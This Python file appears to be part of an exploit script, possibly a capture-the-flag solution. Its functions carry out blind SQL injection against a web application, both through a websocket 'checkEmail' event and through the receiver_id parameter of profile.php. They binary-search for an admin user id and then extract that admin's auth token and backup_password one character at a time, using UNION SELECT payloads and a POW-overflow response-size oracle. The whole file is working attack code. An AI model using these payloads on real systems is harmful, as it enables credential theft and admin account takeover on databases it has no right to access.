import urllib.parse


def find_admin_id_wt_socket(socket, left, right):
    while True:
        mid = round((left + right) / 2)
        print(f"[*] admin id check {mid} -> {right}")
        payload = {
            "token": STATE.auth_token,
            "email": f"%@%' AND admin=1 AND id > {mid} -- ",
        }
        reply = socket.send("checkEmail", payload)
        is_right = '42["emailFound",true]' == reply
        if is_right:
            left = mid
            continue

        payload = {
            "token": STATE.auth_token,
            "email": f"%@%' AND admin=1 AND id = {mid} -- ",
        }
        reply = socket.send("checkEmail", payload)
        equal = '42["emailFound",true]' == reply
        if equal:
            print(f"[+] Found an admin id: {mid}")
            STATE.admin_id = mid
            return mid

        right = mid - 1
        if left > right:
            return None


def find_admin_token_wt_socket(socket, admin_id, base=""):
    while True:
        pos = len(base) + 1
        low, high = 0, 126

        while low <= high:
            mid = (low + high) // 2
            print(f"[*] Token {pos} -> {base}{chr(mid)}")
            sql = (
                f"userId='{admin_id}' AND ASCII(SUBSTRING(BINARY token, {pos}, 1)) > {mid}"
            )
            payload = {
                "token": STATE.auth_token,
                "email": f"x' UNION SELECT 1,1,1,1,1,1,1,1 FROM `AuthTokens` WHERE {sql} -- ",
            }
            is_right = '42["emailFound",true]' == socket.send("checkEmail", payload)
            if is_right:
                low = mid + 1
            else:
                high = mid - 1

        if low == 0 or low > 126:
            print(f"[+] Token: {base}")
            return base

        base = base + chr(low)


def sqli(truthy):
    return f"POW(9999 * IF(({truthy}), 0, 1), 9999)"


def trigger_sqli(args, session, sqli):
    sqli = sqli.replace(" ", "\t")
    safe_string = urllib.parse.quote_plus(sqli)
    url = f"{args.target}/pages/profile.php?user_id=14&receiver_id={safe_string}"
    resp = retry_request(lambda: session.get(url=url, proxies=PROXIES))
    return len(resp.text)


def id_is_equal(args, session, good_size, id):
    resp_size = trigger_sqli(
        args,
        session,
        f"NULL UNION SELECT {sqli(f'id={id}')}, NULL, NULL, NULL FROM users WHERE admin=1 ORDER BY 1 LIMIT 1",
    )
    return resp_size > (good_size - 500)


def id_in_range(args, session, good_size, left, right):
    resp_size = trigger_sqli(
        args,
        session,
        f"NULL UNION SELECT {sqli('id=0')}, NULL, NULL, NULL FROM users WHERE admin=1 AND id>={left} AND id<={right} ORDER BY 1 LIMIT 1",
    )
    return resp_size < (good_size - 500)


def id_eq(args, session, good_size, left, _right):
    resp_size = trigger_sqli(
        args,
        session,
        f"NULL UNION SELECT {sqli('id=0')}, NULL, NULL, NULL FROM users WHERE admin=1 AND id={left} ORDER BY 1 LIMIT 1",
    )
    return resp_size < (good_size - 500)


def find_admin_id(args, session, good_size, left=0, right=1000000):
    while True:
        if left + 1 >= right:
            if id_eq(args, session, good_size, left, left):
                return left
            if id_eq(args, session, good_size, left + 1, left + 1):
                return left + 1
            return None

        mid = round((left + right) / 2)
        left_side = id_in_range(args, session, good_size, left, mid)
        if left_side:
            print(f"[*] left_side {left} {right}")
            right = mid
        else:
            print(f"[*] right_side {left} {right}")
            left = mid


def user_field_gt(args, session, good_size, id, field, base, mid):
    offset = len(base) + 1
    select = f"SELECT {sqli('id=0')}, NULL, NULL, NULL FROM users WHERE id='{id}' AND ASCII(SUBSTRING({field},{offset},1))>{mid}"
    resp_size = trigger_sqli(args, session, f"NULL UNION {select}")
    return resp_size < (good_size - 500)


def user_field_eq(args, session, good_size, id, field, base, mid):
    offset = len(base) + 1
    select = f"SELECT {sqli('id=0')}, NULL, NULL, NULL FROM users WHERE id='{id}' AND ASCII(SUBSTRING({field},{offset},1))={mid}"
    resp_size = trigger_sqli(args, session, f"NULL UNION {select}")
    return resp_size < (good_size - 500)


def user_field_val(
    args, session, good_size, id, field="backup_password", base="", left=33, right=126
):
    while True:
        if left + 2 >= right:
            if user_field_eq(args, session, good_size, id, field, base, left):
                return chr(left)
            if user_field_eq(args, session, good_size, id, field, base, left + 1):
                return chr(left + 1)
            if user_field_eq(args, session, good_size, id, field, base, left + 2):
                return chr(left + 2)
            return None

        mid = round((left + right) / 2)
        right_side = user_field_gt(args, session, good_size, id, field, base, mid)
        if right_side:
            left = mid
        else:
            right = mid

